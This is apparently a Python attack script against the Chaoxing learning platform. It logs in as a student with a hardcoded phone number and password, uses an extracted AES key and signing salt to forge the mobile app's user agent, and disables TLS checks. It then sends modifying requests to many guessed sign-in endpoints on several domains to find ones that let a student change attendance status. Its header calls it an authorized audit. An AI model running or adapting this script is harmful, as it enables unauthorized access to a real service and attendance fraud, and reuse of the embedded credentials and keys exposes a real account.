#!/usr/bin/env python3
"""
Tier 6 - Apps/API/Resource Domain Sign-in API Explorer
Authorized Security Audit
"""
import base64, hashlib, json, uuid, requests, urllib3, time, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

# ── Crypto & Login ──────────────────────────────────────────────────
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

# ── Sign-in params ──────────────────────────────────────────────────
def get_sign_params(uid):
    return {
        "activeId": "5000163891319",
        "uid": uid,
        "courseId": "257485372",
        "classId": "132821141",
        "signType": "0",
        "clientType": "1",
    }

# ── Paths ───────────────────────────────────────────────────────────
COMMON_SIGN_PATHS = [
    "/pptSign/updateSignStatus",
    "/pptSign/updateSignStatusByUidsV2",
    "/pptSign/refeashSignList4Json2",
    "/pptSign/stuSignajax",
    "/newsign/updateSignStatus",
    "/widget/sign/pcTeaSignController/updateSignStatus2",
    "/v2/apis/sign/signIn",
    "/sign/updateSignStatus",
    "/api/sign/updateSignStatus",
    "/mooc-ans/pptSign/updateSignStatusByUidsV2",
    "/mooc-ans/pptSign/refeashSignList4Json2",
    "/mooc-ans/newsign/updateSignStatus",
]

APPS_PATHS = [
    "/app/sign/updateSignStatus",
    "/app/pptSign/updateSignStatus",
    "/course/sign/updateSignStatus",
    "/course/pptSign/updateSignStatus",
]

CSAPI_PATHS = [
    "/cs/sign/updateSignStatus",
    "/cs/pptSign/updateSignStatus",
    "/api/v1/sign/updateSignStatus",
    "/api/v1/pptSign/updateSignStatus",
    "/v1/sign/updateSignStatus",
    "/v1/pptSign/updateSignStatus",
]

FE_PATHS = [
    "/sign/updateSignStatus",
    "/sign/stuSignajax",
    "/api/sign/updateSignStatus",
    "/page/sign/updateSignStatus",
    "/widget/sign/updateSignStatus",
]

# ── Domain config ───────────────────────────────────────────────────
DOMAINS = [
    {"name": "apps.chaoxing.com",       "scheme": "https", "extra": APPS_PATHS},
    {"name": "apps.ananas.chaoxing.com", "scheme": "https", "extra": []},
    {"name": "appswh.chaoxing.com",      "scheme": "https", "extra": APPS_PATHS},
    {"name": "cs-api.chaoxing.com",      "scheme": "https", "extra": CSAPI_PATHS},
    {"name": "resource.chaoxing.com",    "scheme": "https", "extra": []},
    {"name": "fe.chaoxing.com",          "scheme": "https", "extra": FE_PATHS},
    {"name": "mh.chaoxing.com",          "scheme": "https", "extra": FE_PATHS},
]

# ── Helpers ─────────────────────────────────────────────────────────
def trunc(text, maxlen=500):
    t = text.replace('\n', ' ').replace('\r', '')
    return t[:maxlen] + "..." if len(t) > maxlen else t

def is_sign_modify(path):
    """Heuristic: path likely modifies sign-in status"""
    modify_keywords = ["updateSignStatus", "stuSignajax", "signIn", "signIn"]
    return any(kw in path for kw in modify_keywords)

def is_sign_read(path):
    """Heuristic: path likely reads sign-in data"""
    read_keywords = ["refeashSignList", "getSign", "signList", "querySign"]
    return any(kw in path for kw in read_keywords)

# ── Main ────────────────────────────────────────────────────────────
def main():
    print("=" * 80)
    print("Tier 6 - Apps/API/Resource Domain Sign-in API Explorer")
    print("=" * 80)

    # Login as student
    print("\n[*] Logging in as student...")
    stu_session, stu_puid = login("18436633997", "3.1415926Cpy")
    print(f"    Student PUID: {stu_puid}")
    if not stu_puid:
        print("[!] WARNING: Student login may have failed (no PUID cookie)")

    sign_params = get_sign_params(stu_puid)
    print(f"    Sign params: {sign_params}")

    results = {}

    for dom in DOMAINS:
        dname = dom["name"]
        print(f"\n{'=' * 80}")
        print(f"[*] Exploring domain: {dname}")
        print(f"{'=' * 80}")

        domain_result = {
            "alive_https": False,
            "alive_http": False,
            "found_endpoints": [],
            "critical_endpoints": [],
            "interesting_findings": [],
        }

        # 1. Test base URL accessibility
        for scheme in ["https", "http"]:
            base = f"{scheme}://{dname}"
            try:
                r = stu_session.get(base, timeout=15, allow_redirects=True)
                alive_key = "alive_https" if scheme == "https" else "alive_http"
                domain_result[alive_key] = True
                print(f"  [OK] {base} -> {r.status_code} (len={len(r.text)})")
                if len(r.text) < 1000:
                    print(f"       Body: {trunc(r.text, 300)}")
            except requests.exceptions.SSLError:
                print(f"  [SSL ERROR] {base}")
            except requests.exceptions.ConnectionError:
                print(f"  [CONN ERROR] {base}")
            except Exception as e:
                print(f"  [ERROR] {base} -> {type(e).__name__}: {e}")

        # 2. Build path list
        all_paths = list(COMMON_SIGN_PATHS) + dom.get("extra", [])
        # deduplicate while preserving order
        seen = set()
        unique_paths = []
        for p in all_paths:
            if p not in seen:
                seen.add(p)
                unique_paths.append(p)

        # 3. Test each path with GET and POST
        for path in unique_paths:
            url = f"https://{dname}{path}"
            for method in ["GET", "POST"]:
                try:
                    if method == "GET":
                        r = stu_session.get(url, params=sign_params, timeout=15, allow_redirects=False)
                    else:
                        r = stu_session.post(url, data=sign_params, timeout=15, allow_redirects=False)

                    status = r.status_code
                    body = r.text

                    # Skip 404 and connection-level errors
                    if status in (404,):
                        continue

                    # Record found endpoint
                    entry = {
                        "method": method,
                        "url": url,
                        "status": status,
                        "body_preview": trunc(body, 500),
                        "content_type": r.headers.get("Content-Type", ""),
                        "is_modify": is_sign_modify(path),
                        "is_read": is_sign_read(path),
                    }
                    domain_result["found_endpoints"].append(entry)

                    # Flag critical: student can modify sign-in status
                    is_critical = False
                    if is_sign_modify(path) and status in (200, 201, 302):
                        # Check if response indicates success
                        try:
                            j = json.loads(body)
                            if j.get("result") == 1 or j.get("success") or j.get("status") == True:
                                is_critical = True
                        except:
                            # Non-JSON but 200 on a modify endpoint is suspicious
                            if status == 200 and len(body) > 0:
                                is_critical = True  # potential

                    if is_critical:
                        domain_result["critical_endpoints"].append(entry)
                        print(f"  [!!! CRITICAL] {method} {url} -> {status}")
                        print(f"       Body: {trunc(body, 500)}")
                    else:
                        label = "MODIFY" if is_sign_modify(path) else ("READ" if is_sign_read(path) else "OTHER")
                        print(f"  [FOUND] {method} {url} -> {status} [{label}]")
                        print(f"       Body: {trunc(body, 300)}")

                    # Interesting findings
                    lower_body = body.lower()
                    interesting_keywords = ["sign", "签到", "activeid", "checkcode", "location",
                                           "gps", "token", "session", "error", "forbidden",
                                           "unauthorized", "permission", "success", "result"]
                    found_kw = [kw for kw in interesting_keywords if kw in lower_body]
                    if found_kw and status not in (404,):
                        domain_result["interesting_findings"].append({
                            "url": url,
                            "method": method,
                            "status": status,
                            "keywords_found": found_kw,
                        })

                except requests.exceptions.SSLError:
                    pass  # SSL errors are not interesting for path exploration
                except requests.exceptions.ConnectionError:
                    pass  # Connection refused / reset
                except requests.exceptions.Timeout:
                    print(f"  [TIMEOUT] {method} {url}")
                except Exception as e:
                    print(f"  [ERROR] {method} {url} -> {type(e).__name__}: {e}")

            # Also try HTTP for paths that failed HTTPS (only for first path as a sample)
            # We skip this to avoid too many requests; HTTPS is the primary protocol

        results[dname] = domain_result

        # Domain summary
        found_count = len(domain_result["found_endpoints"])
        critical_count = len(domain_result["critical_endpoints"])
        print(f"\n  --- {dname} Summary ---")
        print(f"  Alive (HTTPS): {domain_result['alive_https']}")
        print(f"  Alive (HTTP):  {domain_result['alive_http']}")
        print(f"  Found endpoints: {found_count}")
        print(f"  Critical endpoints: {critical_count}")

    # ── Final Report ────────────────────────────────────────────────
    print("\n\n" + "=" * 80)
    print("FINAL REPORT - Tier 6 Domain Exploration")
    print("=" * 80)

    for dname, res in results.items():
        print(f"\n{'─' * 60}")
        print(f"Domain: {dname}")
        print(f"  Alive (HTTPS): {res['alive_https']}")
        print(f"  Alive (HTTP):  {res['alive_http']}")
        print(f"  Found endpoints: {len(res['found_endpoints'])}")
        print(f"  Critical endpoints: {len(res['critical_endpoints'])}")

        if res['found_endpoints']:
            print(f"\n  Found Endpoints Detail:")
            for ep in res['found_endpoints']:
                label = "MODIFY" if ep['is_modify'] else ("READ" if ep['is_read'] else "OTHER")
                print(f"    [{ep['method']}] {ep['url']}")
                print(f"      Status: {ep['status']} | Type: {ep['content_type']} | Category: {label}")
                print(f"      Body: {ep['body_preview']}")

        if res['critical_endpoints']:
            print(f"\n  *** CRITICAL ENDPOINTS ***")
            for ep in res['critical_endpoints']:
                print(f"    [!!!] {ep['method']} {ep['url']} -> {ep['status']}")
                print(f"         Body: {ep['body_preview']}")

        if res['interesting_findings']:
            print(f"\n  Interesting Findings:")
            for f in res['interesting_findings']:
                print(f"    {f['method']} {f['url']} ({f['status']}) keywords: {f['keywords_found']}")

    print(f"\n{'=' * 80}")
    print("END OF REPORT")
    print("=" * 80)

if __name__ == "__main__":
    main()
